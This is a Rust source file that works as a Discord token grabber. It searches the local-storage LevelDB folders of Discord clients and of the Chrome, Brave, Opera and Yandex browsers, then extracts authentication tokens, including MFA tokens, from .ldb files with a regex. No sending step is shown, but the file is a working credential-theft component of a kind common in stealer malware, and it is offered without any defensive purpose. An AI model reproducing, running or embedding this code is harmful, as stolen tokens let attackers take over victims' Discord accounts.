use std::fs;
use std::path::PathBuf;

use regex::Regex;

// credits to https://github.com/r-o-b-o-t-o

pub fn get_discord_token(path: Option<PathBuf>) -> Vec<String> {
    let paths_to_check = get_paths(path);
    if paths_to_check.len() == 0 {
        return Vec::new();
    }

    let token_regex: Regex = Regex::new(
        r#"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})"#,
    )
        .unwrap();

    let mut final_tokens = Vec::new();
    for path in paths_to_check {
        for entry in fs::read_dir(path).unwrap() {
            if let Ok(entry) = entry {
                let entry_as_path = entry.path();
                let entry_extension = entry_as_path.extension();
                if let Some(ext) = entry_extension {
                    if ext == "ldb" {
                        //apply regex here
                        let result = get_token_from_file(&token_regex, &entry_as_path);
                        if let Some(token) = result {
                            final_tokens.push(token);
                        }
                    }
                }
            }
        }
    }
    final_tokens
}

fn get_token_from_file(token_regex: &Regex, file: &PathBuf) -> Option<String> {
    let raw_bytes = fs::read(file).unwrap();
    let text = String::from_utf8_lossy(&raw_bytes);
    let caps = token_regex.captures(&text);
    if let Some(caps) = caps {
        return Some(caps.get(0).unwrap().as_str().to_string());
    } else {
        return None;
    }
}

fn get_paths(path: Option<PathBuf>) -> Vec<PathBuf> {
    let app_data = path;

    if app_data.is_none() {
        return Vec::new();
    }

    let app_data = app_data.unwrap();

    const POSSIBLE_FOLDERS: [&'static str; 7] =
        ["Discord", "discordcanary", "discordptb", "Google", "BraveSoftware", "Opera Software", "Yandex"];

    let mut paths: Vec<PathBuf> = Vec::new();

    for folder in POSSIBLE_FOLDERS.iter() {
        match folder {
            &"Google" => {
                let new_path = app_data
                    .join(folder)
                    .join("Chrome")
                    .join("User Data")
                    .join("Default")
                    .join("Local Storage")
                    .join("leveldb");
                if !new_path.exists() || !new_path.is_dir() {
                    continue;
                }

                paths.push(new_path);
            }
            &"BraveSoftware" => {
                let new_path = app_data
                    .join(folder)
                    .join("Brave-Browser")
                    .join("User Data")
                    .join("Default")
                    .join("Local Storage")
                    .join("leveldb");
                if !new_path.exists() || !new_path.is_dir() {
                    continue;
                }

                paths.push(new_path);
            }
            &"Opera Software" => {
                let new_path = app_data
                    .join(folder)
                    .join("Opera Stable")
                    .join("Local Storage")
                    .join("leveldb");
                if !new_path.exists() || !new_path.is_dir() {
                    continue;
                }

                paths.push(new_path)
            }
            &"Yandex" => {
                let new_path = app_data
                    .join(folder)
                    .join("YandexBrowser")
                    .join("User Data")
                    .join("Default")
                    .join("Local Storage")
                    .join("leveldb");
                if !new_path.exists() || !new_path.is_dir() {
                    continue;
                }

                paths.push(new_path)
            }
            _ => {
                let new_path = app_data.join(folder).join("Local Storage").join("leveldb");
                if !new_path.exists() || !new_path.is_dir() {
                    continue;
                }

                paths.push(new_path);
            },
        };
    }

    paths
}